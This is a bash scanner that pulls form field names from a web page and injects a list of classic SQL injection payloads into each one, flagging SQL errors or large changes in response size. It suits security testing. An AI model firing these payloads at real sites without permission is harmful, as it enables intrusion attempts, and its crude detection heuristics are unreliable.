#!/bin/bash

# simple_form_sqli.sh - Detect and test SQL injection on input forms

# Configuration
USER_AGENT="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
TIMEOUT=5

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

# Check if page has input elements
has_input_elements() {
    local html="$1"
    
    # Check for various input elements
    if echo "$html" | grep -qi "<input\|<form\|<textarea\|<select"; then
        return 0  # True - has input elements
    fi
    
    # Also check for JavaScript form handlers
    if echo "$html" | grep -qi "document\.forms\|\.submit()\|addEventListener.*submit\|fetch.*POST\|axios\.post"; then
        return 0
    fi
    
    return 1  # False - no input elements
}

# Extract input field names from HTML
extract_input_fields() {
    local html="$1"
    
    # Extract input names from HTML forms
    echo "$html" | grep -i '<input' | grep -o 'name=["'\'']\?[^"'\'' ]*' | \
        sed "s/^name=['\"]//;s/['\"]$//" | grep -v '^$' | sort -u
    
    # Also extract textarea names
    echo "$html" | grep -i '<textarea' | grep -o 'name=["'\'']\?[^"'\'' ]*' | \
        sed "s/^name=['\"]//;s/['\"]$//" | grep -v '^$' | sort -u
    
    # Also extract select names
    echo "$html" | grep -i '<select' | grep -o 'name=["'\'']\?[^"'\'' ]*' | \
        sed "s/^name=['\"]//;s/['\"]$//" | grep -v '^$' | sort -u
}

# SQL injection payloads
declare -a SQLI_PAYLOADS=(
    # Basic payloads
    "' OR '1'='1'-- -"
    "' OR 1=1-- -"
    "' OR 'a'='a'-- -"
    
    # Different quotes
    "\" OR \"1\"=\"1\"-- -"
    "\` OR \`1\`=\`1\`-- -"
    
    # Parentheses
    "') OR '1'='1'-- -"
    "') OR ('1'='1'-- -"
    "')) OR (('1'='1'-- -"
    
    # Numeric
    "1 OR 1=1-- -"
    "1) OR (1=1-- -"
    
    # Boolean false
    "' AND '1'='2'-- -"
    "' OR 1=2-- -"
    
    # Comment variations
    "' OR '1'='1'#"
    "' OR 1=1#"
    "' OR '1'='1'/*"
)

# Test SQL injection on a URL with input field
test_input_sqli() {
    local url="$1"
    local field_name="$2"
    
    echo -e "${BLUE}[*] Testing field: $field_name on $url${NC}"
    
    # Get baseline response
    baseline_response=$(curl -s -L --max-time "$TIMEOUT" "$url")
    baseline_size=$(echo "$baseline_response" | wc -c)
    
    # Track differences
    local significant_differences=0
    
    for payload in "${SQLI_PAYLOADS[@]}"; do
        # URL encode the payload
        encoded_payload=$(echo "$payload" | sed 's/ /%20/g; s/'\''/%27/g; s/"/%22/g; s/#/%23/g')
        
        # Construct test URL
        local test_url=""
        if [[ "$url" == *"?"* ]]; then
            test_url="${url}&${field_name}=${encoded_payload}"
        else
            test_url="${url}?${field_name}=${encoded_payload}"
        fi
        
        # Send request
        response=$(curl -s -L --max-time "$TIMEOUT" "$test_url")
        response_size=$(echo "$response" | wc -c)
        
        # Calculate difference
        local size_diff=$((response_size - baseline_size))
        local abs_diff=${size_diff#-}  # Absolute value
        
        # Check for significant difference
        if [ $abs_diff -gt 100 ]; then
            echo -e "  ${YELLOW}Payload: ${payload:0:30}...${NC}"
            echo -e "    Size: ${baseline_size} → ${response_size} (diff: ${size_diff})"
            significant_differences=$((significant_differences + 1))
        fi
        
        # Check for SQL errors in response
        if echo "$response" | grep -qi "sql.*error\|mysql\|postgres\|oracle\|syntax.*error"; then
            echo -e "  ${RED}[!] SQL error with payload: ${payload:0:30}...${NC}"
            return 0  # Vulnerable
        fi
        
        sleep 0.1
    done
    
    # If we found significant differences in multiple payloads
    if [ $significant_differences -ge 3 ]; then
        echo -e "  ${RED}[!] Multiple significant response differences detected${NC}"
        return 0  # Likely vulnerable
    fi
    
    return 1  # Not vulnerable
}

# Main function to test page for SQL injection
test_page_for_sqli() {
    local url="$1"
    
    echo -e "${GREEN}[*] Analyzing: $url${NC}"
    
    # Fetch the page
    response=$(curl -s -L --max-time "$TIMEOUT" "$url")
    
    # Check if page has input elements
    if ! has_input_elements "$response"; then
        echo -e "${YELLOW}[-] No input elements found on page${NC}"
        return 1
    fi
    
    echo -e "${GREEN}[+] Page contains input elements${NC}"
    
    # Extract input field names
    local fields=$(extract_input_fields "$response")
    local field_count=$(echo "$fields" | wc -l)
    
    echo -e "${BLUE}[+] Found $field_count input field(s):${NC}"
    echo "$fields" | sed 's/^/  - /'
    
    # Test each field
    local vulnerable=0
    while IFS= read -r field; do
        [ -z "$field" ] && continue
        
        if test_input_sqli "$url" "$field"; then
            echo -e "\n${RED}[VULNERABLE] ⚠️ SQL injection found in field: $field${NC}"
            echo -e "  URL: $url"
            vulnerable=1
            break
        fi
    done <<< "$fields"
    
    if [ $vulnerable -eq 0 ]; then
        echo -e "\n${GREEN}[✓] No SQL injection vulnerabilities detected${NC}"
        return 1
    fi
    
    return 0
}

# Quick test function for integration
quick_form_sqli_check() {
    local url="$1"
    
    # Quick check for input elements
    response=$(curl -s -L --max-time 3 "$url" 2>/dev/null || true)
    
    if echo "$response" | grep -qi "<input"; then
        # Found input elements, do quick SQLi test
        echo -e "${YELLOW}[*] Page has forms, testing for SQLi...${NC}"
        
        # Quick test with common payload
        test_url="${url}?test=' OR '1'='1'-- -"
        test_response=$(curl -s -L --max-time 3 "$test_url" 2>/dev/null || true)
        
        baseline_size=$(echo "$response" | wc -c)
        test_size=$(echo "$test_response" | wc -c)
        
        if [ $test_size -gt $((baseline_size * 2)) ] || \
           echo "$test_response" | grep -qi "sql.*error\|mysql\|postgres"; then
            echo -e "${RED}[!] Possible SQL injection${NC}"
            return 0
        fi
    fi
    
    return 1
}

# Usage
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    if [ $# -eq 0 ]; then
        echo "Usage: $0 <URL>"
        echo "Example: $0 https://example.com/form.php"
        exit 1
    fi
    
    test_page_for_sqli "$1"
fi